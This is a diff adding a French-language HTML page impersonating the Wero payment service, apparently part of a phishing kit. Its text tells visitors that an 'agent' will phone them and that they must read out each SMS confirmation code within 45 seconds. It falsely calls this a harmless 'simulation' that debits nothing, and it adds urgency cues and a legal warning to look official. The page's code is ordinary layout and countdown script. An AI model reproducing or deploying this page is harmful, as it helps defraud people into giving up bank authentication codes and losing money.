@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vérification en cours - WERO</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --yellow: #FFF275;
+      --black: #000;
+      --white: #FFFFFF;
+      --gray-light: #f8f9fa;
+      --gray-medium: #e9ecef;
+      --gray-dark: #6c757d;
+      --shadow: 0 10px 30px rgba(0,0,0,0.15);
+      --shadow-light: 0 5px 15px rgba(0,0,0,0.1);
+      --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+      --border-radius: 20px;
+      --green: #28a745;
+      --red: #dc3545;
+      --orange: #fd7e14;
+      --blue: #007bff;
+      --purple: #6f42c1;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: var(--yellow);
+      color: var(--black);
+      line-height: 1.5;
+      overflow-x: hidden;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 1000px;
+      margin: 0 auto;
+      padding: 0 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    header {
+      background: var(--yellow);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      box-shadow: var(--shadow-light);
+      padding: 15px 0;
+      width: 100%;
+    }
+
+    .header-container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+      max-width: 1000px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    .logo { font-size: 32px; font-weight: 900; letter-spacing: -1px; color: var(--black); text-shadow: 1px 1px 2px rgba(0,0,0,0.1); }
+
+    .desktop-nav { display: flex; gap: 30px; }
+    .desktop-nav a {
+      text-decoration: none;
+      color: var(--black);
+      font-weight: 600;
+      font-size: 17px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 16px;
+      border-radius: 50px;
+      transition: var(--transition);
+    }
+    .desktop-nav a:hover, .desktop-nav a.active { background: rgba(0,0,0,0.1); transform: translateY(-2px); }
+
+    .mobile-menu-btn {
+      display: none;
+      background: none;
+      border: none;
+      cursor: pointer;
+      width: 30px;
+      height: 25px;
+      position: relative;
+      z-index: 1001;
+    }
+
+    .mobile-menu-btn span {
+      display: block;
+      width: 100%;
+      height: 3px;
+      background: var(--black);
+      border-radius: 3px;
+      transition: var(--transition);
+      position: absolute;
+    }
+
+    .mobile-menu-btn span:nth-child(1) { top: 0; }
+    .mobile-menu-btn span:nth-child(2) { top: 11px; }
+    .mobile-menu-btn span:nth-child(3) { top: 22px; }
+
+    .mobile-menu-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      z-index: 999;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+
+    .mobile-nav {
+      display: none;
+      position: fixed;
+      top: 0;
+      right: -100%;
+      width: 85%;
+      max-width: 400px;
+      height: 100%;
+      background: var(--yellow);
+      z-index: 1000;
+      box-shadow: -5px 0 15px rgba(0,0,0,0.1);
+      transition: right 0.4s cubic-bezier(0.77, 0.2, 0.05, 1);
+      flex-direction: column;
+    }
+
+    .mobile-nav.active { right: 0; }
+
+    .mobile-nav-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px;
+      border-bottom: 1px solid rgba(0,0,0,0.1);
+    }
+
+    .mobile-menu-close {
+      background: none;
+      border: none;
+      font-size: 24px;
+      color: var(--black);
+      cursor: pointer;
+      width: 40px;
+      height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      transition: var(--transition);
+    }
+
+    .mobile-menu-close:hover { background: rgba(0,0,0,0.1); }
+
+    .mobile-nav-links { flex: 1; padding: 20px 0; }
+    .mobile-nav-links a {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      padding: 18px 30px;
+      text-decoration: none;
+      color: var(--black);
+      font-weight: 600;
+      font-size: 18px;
+      transition: var(--transition);
+      border-left: 4px solid transparent;
+    }
+    .mobile-nav-links a:hover, .mobile-nav-links a.active { background: rgba(0,0,0,0.1); border-left-color: var(--black); }
+
+    .mobile-nav-footer { padding: 20px; text-align: center; border-top: 1px solid rgba(0,0,0,0.1); color: var(--black); font-weight: 600; }
+
+    .mot-hero { padding: 40px 0 30px; text-align: center; width: 100%; display: flex; flex-direction: column; align-items: center; }
+    .mot-hero h1 { font-size: 36px; font-weight: 900; margin-bottom: 15px; color: var(--black); text-align: center; }
+    .mot-hero p { font-size: 16px; color: var(--gray-dark); max-width: 700px; margin: 0 auto 30px; text-align: center; }
+
+    .progress-section {
+      background: var(--white);
+      border-radius: var(--border-radius);
+      padding: 30px;
+      margin: 20px auto;
+      max-width: 800px;
+      width: 100%;
+      box-shadow: var(--shadow);
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .progress-header { margin-bottom: 30px; text-align: center; width: 100%; }
+    .progress-header h2 { font-size: 22px; font-weight: 700; color: var(--black); margin-bottom: 10px; text-align: center; }
+    .progress-header .subtitle {
+      font-size: 16px;
+      color: var(--green);
+      font-weight: 600;
+      background: rgba(40, 167, 69, 0.1);
+      padding: 8px 16px;
+      border-radius: 50px;
+      display: inline-block;
+      text-align: center;
+    }
+
+    .progress-container { width: 100%; margin: 30px 0; display: flex; flex-direction: column; align-items: center; }
+    .progress-label { display: flex; justify-content: space-between; margin-bottom: 10px; font-weight: 600; width: 100%; max-width: 600px; }
+    .progress-label span:first-child { color: var(--black); }
+    .progress-label span:last-child { color: var(--green); font-size: 22px; font-weight: 900; }
+
+    .progress-bar { width: 100%; max-width: 600px; height: 25px; background: var(--gray-medium); border-radius: 12px; overflow: hidden; position: relative; box-shadow: inset 0 2px 5px rgba(0,0,0,0.1); }
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, var(--green), #20c997);
+      border-radius: 12px;
+      width: 100%;
+      position: relative;
+      transition: width 1.5s ease-in-out;
+      box-shadow: 0 2px 10px rgba(40, 167, 69, 0.3);
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.9; } 100% { opacity: 1; } }
+
+    .progress-fill::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(90deg, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0.3) 50%, rgba(255,255,255,0.1) 100%);
+      animation: shimmer 2s infinite;
+    }
+
+    @keyframes shimmer { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+
+    .mot-content {
+      background: var(--white);
+      border-radius: var(--border-radius);
+      padding: 45px;
+      margin: 30px auto;
+      max-width: 800px;
+      width: 100%;
+      box-shadow: var(--shadow);
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .mot-header { margin-bottom: 30px; text-align: center; width: 100%; }
+    .mot-header h3 { font-size: 22px; font-weight: 700; color: var(--black); margin-bottom: 20px; text-align: center; }
+
+    .status-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      background: var(--gray-light);
+      padding: 12px 20px;
+      border-radius: 8px;
+      margin-bottom: 25px;
+      justify-content: center;
+      color: var(--green);
+      font-weight: 600;
+      font-size: 16px;
+    }
+
+    .status-badge i { color: var(--green); font-size: 20px; }
+
+    .timer-section {
+      background: var(--gray-light);
+      border-radius: var(--border-radius);
+      padding: 35px;
+      margin: 30px auto;
+      max-width: 600px;
+      width: 100%;
+      text-align: center;
+      border: 2px solid var(--gray-medium);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .timer-label { font-size: 18px; color: var(--gray-dark); margin-bottom: 20px; font-weight: 500; text-align: center; }
+
+    .timer-display {
+      display: flex;
+      justify-content: center;
+      align-items: baseline;
+      gap: 20px;
+      margin-bottom: 20px;
+    }
+
+    .timer-block { display: flex; flex-direction: column; align-items: center; }
+    .timer-number { font-size: 64px; font-weight: 900; color: var(--black); font-family: 'Courier New', monospace; line-height: 1; margin-bottom: 5px; }
+    .timer-unit { font-size: 18px; color: var(--gray-dark); font-weight: 600; text-transform: uppercase; }
+    .timer-separator { font-size: 48px; font-weight: 700; color: var(--gray-dark); margin: 0 5px; }
+
+    .text-content { width: 100%; max-width: 700px; text-align: left; margin-top: 30px; }
+    .text-content p { font-size: 16px; line-height: 1.7; color: var(--black); margin-bottom: 20px; text-align: left; }
+    .text-content p.highlight { background: rgba(255, 242, 117, 0.2); padding: 20px; border-radius: 10px; border-left: 4px solid var(--yellow); font-size: 16px; font-weight: 500; }
+    .text-content strong { font-weight: 700; color: var(--black); }
+
+    footer {
+      background: var(--black);
+      color: var(--white);
+      padding: 60px 0 30px;
+      margin-top: auto;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .footer-content { display: flex; flex-wrap: wrap; justify-content: center; gap: 40px; margin-bottom: 40px; width: 100%; max-width: 1000px; }
+    .footer-section { flex: 1; min-width: 250px; display: flex; flex-direction: column; align-items: center; text-align: center; }
+    .footer-section h3 { font-size: 24px; margin-bottom: 20px; color: var(--yellow); text-align: center; }
+    .footer-section p { margin-bottom: 15px; opacity: 0.9; text-align: center; }
+    .footer-section a { display: block; color: var(--white); text-decoration: none; margin-bottom: 10px; opacity: 0.8; transition: var(--transition); text-align: center; }
+    .footer-section a:hover { opacity: 1; transform: translateX(5px); }
+
+    .footer-bottom { text-align: center; padding-top: 30px; border-top: 1px solid rgba(255,255,255,0.1); opacity: 0.7; width: 100%; max-width: 1000px; }
+
+    .slide-in { opacity: 0; transform: translateY(30px); transition: all 0.8s cubic-bezier(0.22, 1, 0.36, 1); }
+    .slide-in.visible { opacity: 1; transform: translateY(0); }
+
+    @media (max-width: 768px) {
+      .desktop-nav { display: none; }
+      .mobile-menu-btn { display: block; }
+      .mobile-nav { display: flex; }
+      .mobile-menu-overlay.active { display: block; opacity: 1; }
+      .mobile-nav.active { right: 0; }
+      .mobile-menu-btn.active span:nth-child(1) { transform: rotate(45deg); top: 11px; }
+      .mobile-menu-btn.active span:nth-child(2) { opacity: 0; }
+      .mobile-menu-btn.active span:nth-child(3) { transform: rotate(-45deg); top: 11px; }
+      .logo { font-size: 28px; }
+      .mot-hero h1 { font-size: 28px; }
+      .mot-hero p { font-size: 15px; }
+      .progress-section { padding: 20px; margin: 15px; }
+      .mot-content { padding: 25px; }
+      .timer-number { font-size: 48px; }
+      .text-content p { font-size: 15px; }
+      .container, .header-container, .footer-content, .footer-bottom { max-width: 100%; padding: 0 15px; }
+    }
+
+    @media (max-width: 480px) {
+      .container { padding: 0 15px; }
+      .logo { font-size: 24px; }
+      .mot-hero h1 { font-size: 24px; }
+      .mot-hero p { font-size: 14px; }
+      .timer-display { flex-direction: column; gap: 10px; }
+      .timer-separator { display: none; }
+      .footer-content { flex-direction: column; gap: 30px; }
+      .text-content p { font-size: 14px; text-align: center; }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="header-container">
+      <div class="logo">WERO</div>
+      
+      <nav class="desktop-nav">
+        <a href="/">Accueil</a>
+        <a href="/accords">Accords</a>
+        <a href="/premiere">Première</a>
+        <a href="/deuxieme" class="active">Vérification</a>
+      </nav>
+      
+      <button class="mobile-menu-btn" aria-label="Menu">
+        <span></span>
+        <span></span>
+        <span></span>
+      </button>
+      
+      <div class="mobile-menu-overlay"></div>
+      
+      <nav class="mobile-nav">
+        <div class="mobile-nav-header">
+          <div class="logo">WERO</div>
+          <button class="mobile-menu-close" aria-label="Fermer">
+            <i class="fas fa-times"></i>
+          </button>
+        </div>
+        <div class="mobile-nav-links">
+          <a href="/">Accueil</a>
+          <a href="/accords">Accords</a>
+          <a href="/premiere">Première</a>
+          <a href="/deuxieme" class="active">Vérification</a>
+        </div>
+        <div class="mobile-nav-footer">
+          <p>Paiement instantané sécurisé</p>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <section class="mot-hero">
+      <div class="container">
+        <h1 class="slide-in">Vérification en cours...!</h1>
+        <p class="slide-in">Confirmation de votre identité pour sécuriser votre transaction</p>
+      </div>
+    </section>
+
+    <section class="progress-section slide-in">
+      <div class="container">
+        <div class="progress-header">
+          <h2>PROGRESSION DE LA VALIDATION</h2>
+          <div class="subtitle">Vérification téléphonique à 100%</div>
+        </div>
+        
+        <div class="progress-container">
+          <div class="progress-label">
+            <span>Avancement</span>
+            <span>100%</span>
+          </div>
+          <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+          </div>
+        </div>
+        
+        <div style="margin-top: 25px; color: var(--green); font-weight: 600; font-size: 16px;">
+          <i class="fas fa-check-circle"></i> Toutes les étapes préalables sont terminées
+        </div>
+      </div>
+    </section>
+
+    <section class="mot-content slide-in">
+      <div class="container">
+        <div class="mot-header">
+          <h3>PAIEMENT SANS PRISE DE TÊTE</h3>
+          
+          <div class="status-badge">
+            <i class="fas fa-check-circle"></i>
+            <span>Transaction en attente de confirmation</span>
+          </div>
+        </div>
+        
+        <div class="timer-section">
+          <div class="timer-label">Temps estimé avant l'appel :</div>
+          <div class="timer-display">
+            <div class="timer-block">
+              <div class="timer-number" id="minutes">09</div>
+              <div class="timer-unit">Minutes</div>
+            </div>
+            <div class="timer-separator">:</div>
+            <div class="timer-block">
+              <div class="timer-number" id="seconds">28</div>
+              <div class="timer-unit">Secondes</div>
+            </div>
+          </div>
+          <div class="timer-label">Restez disponible près de votre téléphone</div>
+        </div>
+        
+        <div class="text-content">
+          <p>Suite aux nouvelles mesures de sécurité, vous aurez vos fonds sur votre compte uniquement après avoir confirmé que vous êtes bien le/la titulaire du compte bancaire enregistré sur votre compte Wero.</p>
+          
+          <p>Pour terminer la confirmation de votre identité, un agent Wero vous contactera par téléphone dans les meilleurs délais.</p>
+          
+          <p class="highlight">
+            <i class="fas fa-shield-alt"></i> Afin de lutter contre les fraudes à la carte bancaire, nous procéderons à une vérification en vous envoyant différents codes par SMS ou notifications à valider sur votre appareil de confiance.
+          </p>
+          
+          <p>Pour la confirmation de votre identité et l'activation de votre compte WERO, nous procéderons à une simulation de nos différentes compagnies en vous faisant parvenir des différents codes par SMS.</p>
+          
+          <p>Vous devez nous communiquer les codes de confirmation que vous recevrez par SMS dans un instant. Cela témoignera du fait que vous soyez bel et bien le titulaire du numéro de carte.</p>
+          
+          <p>Rassurez-vous, c'est une simulation de code, ce que nous recherchons à vérifier via cette simulation est votre appartenance à la carte bancaire que vous nous avez communiqué pour l'activation WERO. NB : nous vous rassurons que vous ne serez débité d'aucun centime via cette confirmation d'identité. Après avoir passé l'étape avec succès, nous procéderons à l'activation de votre compte WERO.</p>
+          
+          <p><strong>Pour cela, vous disposez d'un délai de 45 secondes pour nous retourner chaque code. Passé ce délai, nous ne pourrons pas prendre en compte ce numéro de carte et valider votre activation.</strong></p>
+          
+          <p style="color: var(--red); font-weight: 600; background: rgba(220, 53, 69, 0.1); padding: 15px; border-radius: 8px; border-left: 4px solid var(--red);">
+            <i class="fas fa-exclamation-triangle"></i> Attention : l'usage frauduleux du numéro de carte bancaire d'une autre personne sans son consentement constitue juridiquement un délit d'escroquerie sanctionné par l'article 313-1 du code pénal d'une peine de 5 ans d'emprisonnement et 375 000 € d'amende.
+          </p>
+          
+          <p style="font-size: 14px; color: var(--gray-dark); font-style: italic;">
+            En cas de litige, veuillez contacter notre service client.
+          </p>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <div class="container">
+      <div class="footer-content">
+        <div class="footer-section">
+          <h3>WERO</h3>
+          <p>Solutions de paiement sécurisées</p>
+        </div>
+        
+        <div class="footer-section">
+          <h3>Navigation</h3>
+          <a href="/">Accueil</a>
+          <a href="/accords">Accords</a>
+          <a href="/premiere">Première</a>
+          <a href="/deuxieme">Vérification</a>
+        </div>
+      </div>
+      
+      <div class="footer-bottom">
+        <p>&copy; WERO. Tous droits réservés. | <a href="#" style="color: var(--yellow);">Politique de confidentialité</a> | <a href="#" style="color: var(--yellow);">Conditions d'utilisation</a></p>
+        <p style="font-size: 12px; margin-top: 10px;">
+          <i class="fas fa-lock"></i> Service de paiement agréé | Sécurisé PCI DSS
+        </p>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      // Menu mobile
+      const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
+      const mobileMenuClose = document.querySelector('.mobile-menu-close');
+      const mobileMenuOverlay = document.querySelector('.mobile-menu-overlay');
+      const mobileNav = document.querySelector('.mobile-nav');
+      const mobileLinks = document.querySelectorAll('.mobile-nav-links a');
+      
+      mobileMenuBtn.addEventListener('click', () => {
+        mobileNav.classList.add('active');
+        mobileMenuOverlay.classList.add('active');
+        mobileMenuBtn.classList.add('active');
+        document.body.style.overflow = 'hidden';
+      });
+      
+      function closeMobileMenu() {
+        mobileNav.classList.remove('active');
+        mobileMenuOverlay.classList.remove('active');
+        mobileMenuBtn.classList.remove('active');
+        document.body.style.overflow = '';
+      }
+      
+      mobileMenuClose.addEventListener('click', closeMobileMenu);
+      mobileMenuOverlay.addEventListener('click', closeMobileMenu);
+      mobileLinks.forEach(link => link.addEventListener('click', closeMobileMenu));
+      
+      // Animation slide-in
+      const elements = document.querySelectorAll('.slide-in');
+      const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+          if (entry.isIntersecting) {
+            entry.target.classList.add('visible');
+            observer.unobserve(entry.target);
+          }
+        });
+      }, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });
+      elements.forEach(el => observer.observe(el));
+      
+      // Timer
+      const minutesElement = document.getElementById('minutes');
+      const secondsElement = document.getElementById('seconds');
+      const progressFill = document.getElementById('progressFill');
+      
+      setTimeout(() => { progressFill.style.width = '100%'; }, 500);
+      
+      function startCountdown() {
+        let minutes = 9;
+        let seconds = 28;
+        
+        const countdownInterval = setInterval(() => {
+          minutesElement.textContent = minutes.toString().padStart(2, '0');
+          secondsElement.textContent = seconds.toString().padStart(2, '0');
+          
+          if (seconds === 0) {
+            if (minutes === 0) {
+              clearInterval(countdownInterval);
+              minutesElement.textContent = "00";
+              secondsElement.textContent = "00";
+              minutesElement.style.color = "var(--red)";
+              secondsElement.style.color = "var(--red)";
+            } else {
+              minutes--;
+              seconds = 59;
+            }
+          } else {
+            seconds--;
+          }
+        }, 1000);
+      }
+      
+      startCountdown();
+      
+      window.addEventListener('resize', () => {
+        if (window.innerWidth > 768 && mobileNav.classList.contains('active')) {
+          closeMobileMenu();
+        }
+      });
+    });
+  </script>
+</body>
+</html>
